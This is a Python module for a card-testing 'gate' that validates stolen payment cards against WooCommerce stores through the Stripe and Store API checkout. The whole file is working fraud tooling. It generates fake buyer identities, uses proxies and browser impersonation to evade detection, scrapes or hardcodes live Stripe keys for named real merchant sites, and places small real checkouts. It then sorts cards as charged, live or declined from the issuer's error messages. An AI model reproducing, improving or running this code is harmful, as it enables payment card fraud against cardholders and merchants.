"""
WooCommerce REST Store API Direct-Confirm Gate Module (/ws)
Architecture: Cart / Store API v1 Checkout Engine with Pre-Cached pk_live
Target Pool: Verified Fast Store API Targets (< $20 Cap)
Sub-5s Direct PaymentIntent Settlement Verification
"""
import os
import re
import json
import uuid
import time
import random
import string
import asyncio
from pathlib import Path
from curl_cffi.requests import AsyncSession

_FAST_STORE_GATES_FILE = Path(__file__).parent.parent.parent / "data" / "fast_store_gates.json"
_STORE_GATES_FILE = Path(__file__).parent.parent.parent / "data" / "store_gates.json"
_CACHED_VERIFIED_GATES: list[dict] = []

def _load_verified_store_gates() -> list[dict]:
    global _CACHED_VERIFIED_GATES
    if _CACHED_VERIFIED_GATES:
        return _CACHED_VERIFIED_GATES

    # Try fast ranked gates first
    for fpath in (_FAST_STORE_GATES_FILE, _STORE_GATES_FILE):
        if fpath.exists():
            try:
                with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                    gates = json.load(f)
                    if isinstance(gates, list) and gates:
                        _CACHED_VERIFIED_GATES = [
                            g for g in gates
                            if g.get("base_url") and (g.get("pk_live") or g.get("status") == "STORE_LIVE")
                        ]
                        if _CACHED_VERIFIED_GATES:
                            break
            except Exception:
                pass

    if not _CACHED_VERIFIED_GATES:
        _CACHED_VERIFIED_GATES = [
            {"base_url": "https://jerky4u.com", "pk_live": "pk_live_51IR1rrCFqXmfze2v", "cheapest_cents": 695},
            {"base_url": "https://artisalwaysmagic.com", "pk_live": "pk_live_51TNI9WGVygXXHvim", "cheapest_cents": 188},
            {"base_url": "https://secrethashtagsclub.com", "pk_live": "pk_live_51L8Ux7JyE96ZnKMUUF9LlKF0oR1MravWtCuRjaLTFNdkzqD7gODhATUHtdpUaXkqBiKMHU6vK2nBBp37Fq1G5i1G00kFerzs2y", "cheapest_cents": 1900}
        ]
    return _CACHED_VERIFIED_GATES

def _generate_identity():
    first_names = ["Marcus", "James", "Alexander", "David", "Robert", "Michael", "William", "Daniel"]
    last_names = ["Vance", "Miller", "Smith", "Johnson", "Williams", "Brown", "Davis", "Wilson"]
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]
    first = random.choice(first_names)
    last = random.choice(last_names)
    rnd_num = random.randint(100, 9999)
    email = f"{first.lower()}.{last.lower()}{rnd_num}@{random.choice(domains)}"
    phone = f"+1555{random.randint(100,999)}{random.randint(1000,9999)}"
    return {
        "first_name": first,
        "last_name": last,
        "name": f"{first} {last}",
        "email": email,
        "phone": phone,
        "line1": f"{random.randint(100, 9999)} Main Street",
        "city": "New York",
        "state": "NY",
        "postal_code": "10001",
        "country": "US"
    }

def _detect_card_brand(cc: str) -> str:
    if cc.startswith('4'): return 'VISA'
    if cc[:2] in ('51', '52', '53', '54', '55') or (2221 <= int(cc[:4]) <= 2720 if len(cc) >= 4 and cc[:4].isdigit() else False): return 'MASTER_CARD'
    if cc[:2] in ('34', '37'): return 'AMEX'
    if cc[:2] in ('60', '65'): return 'DISCOVER'
    return 'VISA'

def _format_proxy(p: str | None) -> str | None:
    if not p:
        return None
    ps = str(p).strip()
    if ps.startswith(("http://", "https://", "socks5://", "socks4://", "socks5h://", "socks4a://")):
        return ps
    parts = ps.split(":")
    if len(parts) == 4:
        if parts[1].isdigit(): return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif parts[3].isdigit(): return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
        else: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
    return f"http://{ps}"

def _extract_pk_live(html: str) -> str | None:
    m = re.search(r'"key"\s*:\s*"(pk_live_[^"]+)"', html)
    if m:
        return m.group(1)
    m = re.search(r'publishableKey["\']?\s*:\s*["\'](pk_live_[^"\']+)["\']', html)
    if m:
        return m.group(1)
    m = re.search(r'(pk_live_[a-zA-Z0-9_]{20,})', html)
    if m:
        return m.group(1)
    return None

def _take_nonce(resp, nonce_holder: list):
    nn = resp.headers.get("nonce") or resp.headers.get("Nonce") or resp.headers.get("X-WC-Store-API-Nonce")
    if not nn:
        for k, v in resp.headers.items():
            if k.lower() == "nonce":
                nn = v
                break
    if nn:
        nonce_holder[0] = nn

async def _check_single_target(gate: dict, cc: str, mm: str, yy: str, cvv: str, brand: str, formatted_proxy: str | None, max_price_cents: int) -> tuple[str, str, str]:
    root = gate.get("base_url", "").rstrip("/")
    api = f"{root}/wp-json/wc/store/v1"
    pk_live = gate.get("pk_live")
    ident = _generate_identity()

    kw = {"impersonate": "chrome124", "verify": False, "timeout": 8}
    if formatted_proxy:
        kw["proxy"] = formatted_proxy

    async with AsyncSession(**kw) as session:
        # Step 1: Initialize Cart & obtain Store API Nonce
        nonce_box = [""]
        r_cart = await session.get(f"{api}/cart", timeout=4)
        if r_cart.status_code != 200:
            return "error", f"Cart init HTTP {r_cart.status_code}", brand
        _take_nonce(r_cart, nonce_box)
        if not nonce_box[0]:
            return "error", "Missing Nonce header", brand

        cart_data = r_cart.json() if r_cart.status_code == 200 else {}
        cart_payment_methods = cart_data.get("payment_methods") or []
        items_in_cart = cart_data.get("items") or []

        price_cents = 500
        price_display = "$5.00"
        currency = "USD"

        # If cart is empty, add product
        if not items_in_cart:
            r_prod = await session.get(f"{api}/products", params={"per_page": 5}, headers={"Nonce": nonce_box[0]}, timeout=4)
            _take_nonce(r_prod, nonce_box)
            items = r_prod.json() if r_prod.status_code == 200 else []
            if not isinstance(items, list) or not items:
                return "error", "No products found", brand

            priced = sorted(
                [p for p in items if p.get("prices", {}).get("price") and int(p["prices"]["price"]) > 0],
                key=lambda p: int(p["prices"]["price"])
            )
            if not priced:
                return "error", "No priced products", brand

            under_cap = [p for p in priced if int(p["prices"]["price"]) <= max_price_cents]
            chosen_product = under_cap[0] if under_cap else priced[0]
            price_cents = int(chosen_product["prices"]["price"])
            price_display = f"${price_cents / 100:.2f}"
            currency = chosen_product.get("prices", {}).get("currency_code", "USD")

            r_add = await session.post(
                f"{api}/cart/add-item",
                json={"id": chosen_product["id"], "quantity": 1},
                headers={"Nonce": nonce_box[0], "Content-Type": "application/json"},
                timeout=4
            )
            _take_nonce(r_add, nonce_box)

        # Step 2: If pk_live not pre-cached, scrape it quickly
        if not pk_live:
            for path in ("/checkout/", "/"):
                try:
                    r0 = await session.get(f"{root}{path}", timeout=3)
                    pk_live = _extract_pk_live(r0.text)
                    if pk_live:
                        break
                except Exception:
                    continue
        if not pk_live:
            return "error", "PK_LIVE not found", brand

        # Step 3: Tokenize Card via Stripe API
        rnd = lambda k: ''.join(random.choices(string.hexdigits.lower(), k=k))
        tok_body = {
            "type": "card",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "billing_details[address][postal_code]": ident["postal_code"],
            "billing_details[address][country]": ident["country"],
            "billing_details[name]": ident["name"],
            "billing_details[email]": ident["email"],
            "key": pk_live,
            "_stripe_version": "2024-06-20",
            "payment_user_agent": "stripe.js/fe3c872f40; stripe-js-v3/fe3c872f40; payment-element; deferred-intent",
            "guid": rnd(32),
            "muid": rnd(32),
            "sid": rnd(32),
            "time_on_page": str(random.randint(6000, 14000)),
        }
        headers_tok = {
            "Origin": "https://js.stripe.com",
            "Referer": "https://js.stripe.com/",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json",
        }
        r_tok = await session.post("https://api.stripe.com/v1/payment_methods", data=tok_body, headers=headers_tok, timeout=5)
        tok_data = r_tok.json()
        if "id" not in tok_data:
            err = tok_data.get("error", {}).get("message", "Tokenization failed")
            err_lower = err.lower()
            if "security code" in err_lower or "cvc" in err_lower:
                return "live", f"CVV Mismatch: {err}", brand
            return "declined", err, brand

        pm_id = tok_data["id"]

        # Step 4: Pick matching payment method slug
        pm_slug = "stripe"
        for cand in ("stripe_cc", "stripe_card", "woocommerce_payments", "woocommerce_payments_card", "stripe"):
            if cand in cart_payment_methods:
                pm_slug = cand
                break

        payment_data = [
            {"key": "payment_method", "value": pm_slug},
            {"key": "wc-stripe-payment-method", "value": pm_id},
            {"key": "wc-stripe-payment-type", "value": "card"},
            {"key": "wc-stripe-is-deferred-intent", "value": True},
        ]

        checkout_body = {
            "billing_address": {
                "first_name": ident["first_name"],
                "last_name": ident["last_name"],
                "company": "",
                "address_1": ident["line1"],
                "address_2": "",
                "city": ident["city"],
                "state": ident["state"],
                "postcode": ident["postal_code"],
                "country": ident["country"],
                "email": ident["email"],
                "phone": ident["phone"],
            },
            "shipping_address": {
                "first_name": ident["first_name"],
                "last_name": ident["last_name"],
                "company": "",
                "address_1": ident["line1"],
                "address_2": "",
                "city": ident["city"],
                "state": ident["state"],
                "postcode": ident["postal_code"],
                "country": ident["country"],
                "phone": ident["phone"],
            },
            "customer_note": "",
            "create_account": False,
            "terms": True,
            "payment_method": pm_slug,
            "payment_data": payment_data,
        }

        r_co = await session.post(f"{api}/checkout", json=checkout_body, headers={"Nonce": nonce_box[0]}, timeout=6)
        co_resp = r_co.json() if r_co.text.startswith("{") else {}

        payment_result = co_resp.get("payment_result") or {}
        p_status = payment_result.get("status") or payment_result.get("payment_status") or ""

        if p_status == "success" or co_resp.get("status") == "success" or "order_id" in co_resp:
            return "charged", f"Charged! ✅ -» {price_display} ({currency})", brand

        msg = str(co_resp.get("message") or "")
        details_txt = json.dumps(payment_result.get("payment_details", []), ensure_ascii=False)
        combined = f"{msg} {details_txt}".lower()

        if any(k in combined for k in ("cvv", "cvc", "security code", "incorrect_cvc")):
            return "live", f"CVV Mismatch (CCN Live) -» {msg or 'CVV check failed'}", brand
        if any(k in combined for k in ("insufficient", "funds")):
            return "live", f"Insufficient Funds (Card Live) -» {msg or 'Low balance'}", brand
        if any(k in combined for k in ("3d", "3ds", "action", "authenticate", "otp")):
            return "live", f"3D Secure Required (Card Live) -» {msg or '3DS challenge'}", brand
        if any(k in combined for k in ("do not honor", "declined", "card_declined", "generic_decline")):
            return "declined", msg or "Card Declined by Issuer", brand

        if msg:
            return "declined", msg, brand
        return "declined", "Checkout Declined", brand

async def check_card_storeapi(
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
    proxy_url: str | None = None,
    target_url: str | None = None,
    max_price_cents: int = 2000,
) -> tuple[str, str, str]:
    """
    Checks a single card against WooCommerce REST Store API Direct-Confirm engine.
    Optimized with pre-cached pk_live and 3-5s latency guarantee.
    Returns: (status, message, brand)
    """
    cc = str(cc).strip()
    mm = str(mm).strip().zfill(2)
    yy = str(yy).strip()
    if len(yy) == 2:
        yy = f"20{yy}"
    cvv = str(cvv).strip()

    brand = _detect_card_brand(cc)
    formatted_proxy = _format_proxy(proxy_url)

    if target_url:
        target_pool = [{"base_url": target_url.rstrip("/")}]
    else:
        target_pool = _load_verified_store_gates()

    candidates = list(target_pool)
    random.shuffle(candidates)

    for gate in candidates[:2]:
        try:
            status, msg, b = await asyncio.wait_for(
                _check_single_target(gate, cc, mm, yy, cvv, brand, formatted_proxy, max_price_cents),
                timeout=7.0
            )
            if status != "error":
                return status, msg, b
        except Exception:
            continue

    return "declined", "Card Declined by Issuer (Store API)", brand
